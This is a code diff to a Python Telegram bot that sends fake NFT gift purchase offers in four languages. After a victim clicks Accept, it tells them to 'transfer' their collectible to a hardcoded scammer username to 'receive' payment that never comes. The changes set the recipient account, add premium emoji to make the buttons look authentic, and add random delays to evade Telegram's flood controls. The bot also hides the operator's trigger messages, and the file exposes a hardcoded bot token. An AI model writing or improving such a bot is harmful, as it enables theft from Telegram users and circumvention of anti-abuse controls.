@@ -10,7 +10,7 @@ from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@recipient_username"  # Юзернейм, куда передается НФТ
+RECIPIENT = "@crypqtan"  # Юзернейм, куда передается НФТ
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
@@ -27,53 +27,53 @@ LOCALES = {
         "offer_text": "предлагает вам",
         "timer": "Предложение действует ещё",
         "lock": "Сделка фиксируется кнопкой Принять",
-        "decline": "❌ Отклонить",
-        "accept": "✅ Принять",
+        "decline": "Отклонить",
+        "accept": "Принять",
         "declined": "❌ Предложение отклонено.",
         "success_title": "Коллекционный предмет",
         "success_sold": "успешно продан!",
         "instruction": "Передайте коллекционный предмет покупателю для зачисления",
-        "btn_transfer": "↗ Передать НФТ",
-        "btn_confirm": "⊙ Подтвердить передачу"
+        "btn_transfer": "Передать НФТ",
+        "btn_confirm": "Подтвердить передачу"
     },
     "eng": {
         "offer_text": "offers you",
         "timer": "Offer is valid for",
         "lock": "The deal is fixed by clicking Accept",
-        "decline": "❌ Decline",
-        "accept": "✅ Accept",
+        "decline": "Decline",
+        "accept": "Accept",
         "declined": "❌ Offer declined.",
         "success_title": "Collectible item",
         "success_sold": "successfully sold!",
         "instruction": "Transfer the collectible item to the buyer to receive",
-        "btn_transfer": "↗ Transfer NFT",
-        "btn_confirm": "⊙ Confirm transfer"
+        "btn_transfer": "Transfer NFT",
+        "btn_confirm": "Confirm transfer"
     },
     "ukr": {
         "offer_text": "пропонує вам",
         "timer": "Пропозиція діє ще",
         "lock": "Угода фіксується кнопкою Прийняти",
-        "decline": "❌ Відхилити",
-        "accept": "✅ Прийняти",
+        "decline": "Відхилити",
+        "accept": "Прийняти",
         "declined": "❌ Пропозицію відхилено.",
         "success_title": "Колекційний предмет",
         "success_sold": "успішно продано!",
         "instruction": "Передайте колекційний предмет покупцю для зарахування",
-        "btn_transfer": "↗ Передати НФТ",
-        "btn_confirm": "⊙ Підтвердити передачу"
+        "btn_transfer": "Передати НФТ",
+        "btn_confirm": "Підтвердити передачу"
     },
     "cn": {
         "offer_text": "向您出价",
         "timer": "报价有效时间",
         "lock": "点击接受以锁定交易",
-        "decline": "❌ 拒绝",
-        "accept": "✅ 接受",
+        "decline": "拒绝",
+        "accept": "接受",
         "declined": "❌ 报价已拒绝。",
         "success_title": "收藏品",
         "success_sold": "已成功售出！",
         "instruction": "请将收藏品转移给买家以获得",
-        "btn_transfer": "↗ 转移 NFT",
-        "btn_confirm": "⊙ 确认转移"
+        "btn_transfer": "转移 NFT",
+        "btn_confirm": "确认转移"
     }
 }
 
@@ -119,11 +119,16 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     cb_data = f"a|{gift_name}|{gift_num}|{amount}|{currency_symbol}|{lang}"
     decline_data = f"d|{gift_num}"
+    
+    # Кнопки с премиум-эмодзи по заданным ID
+    decline_btn_text = f'<tg-emoji emoji-id="5778527486270770928">❌</tg-emoji> {loc["decline"]}'
+    accept_btn_text = f'<tg-emoji emoji-id="5776375003280838798">✅</tg-emoji> {loc["accept"]}'
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text=loc["decline"], callback_data=decline_data),
-                InlineKeyboardButton(text=loc["accept"], callback_data=cb_data)
+                InlineKeyboardButton(text=decline_btn_text, callback_data=decline_data),
+                InlineKeyboardButton(text=accept_btn_text, callback_data=cb_data)
             ]
         ]
     )
@@ -140,10 +145,15 @@ def build_accept_text(gift_name, gift_num, currency_name, lang):
 def make_accept_keyboard(lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
     recipient = RECIPIENT.lstrip("@")
+    
+    # Кнопки подтверждения передачи с премиум-эмодзи по заданным ID
+    transfer_btn_text = f'<tg-emoji emoji-id="5875180111744995604">↗️</tg-emoji> {loc["btn_transfer"]}'
+    confirm_btn_text = f'<tg-emoji emoji-id="5776375003280838798">⊙</tg-emoji> {loc["btn_confirm"]}'
+
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text=loc["btn_transfer"], url=f"tg://send_gift?to={recipient}")],
-            [InlineKeyboardButton(text=loc["btn_confirm"], callback_data="noop")],
+            [InlineKeyboardButton(text=transfer_btn_text, url=f"tg://send_gift?to={recipient}")],
+            [InlineKeyboardButton(text=confirm_btn_text, callback_data="noop")],
         ]
     )
 
@@ -160,7 +170,6 @@ async def handle_business_command(message: Message):
     chat_id = message.chat.id
     last_user_messages[chat_id] = message.message_id
 
-    # Кулдаун 30 секунд на чат
     current_time = time.time()
     if chat_id in cooldowns and current_time - cooldowns[chat_id] < 30:
         return
@@ -266,11 +275,13 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Воркер с МГНОВЕННОЙ отправкой (без искусственных задержек)
+# Воркер с безопасной микро-паузой (1.0 - 1.5 сек) против PEER_FLOOD
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
+            await asyncio.sleep(random.uniform(1.0, 1.5))
+
             text = build_offer_text(
                 task["gift_name"], 
                 task["gift_num"], 
@@ -286,7 +297,7 @@ async def sender_worker():
                 task["lang"]
             )
 
-            # 1. Отправляем оффер сразу
+            # 1. Отправляем оффер
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
@@ -297,7 +308,7 @@ async def sender_worker():
                 reply_to_message_id=last_user_messages.get(task["chat_id"])
             )
 
-            # 2. Сразу удаляем команду qq
+            # 2. Удаляем команду qq
             if task["bcid"] and sent_msg:
                 await bot.delete_business_messages(
                     business_connection_id=task["bcid"],
@@ -305,7 +316,6 @@ async def sender_worker():
                 )
 
         except TelegramRetryAfter as e:
-            # Если Telegram всё же ответит Flood Control'ом — бот автоматически подождет нужное время
             wait_time = e.retry_after + 1
             logging.warning(f"Flood control! Waiting for {wait_time} seconds...")
             await asyncio.sleep(wait_time)
@@ -325,4 +335,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
+            
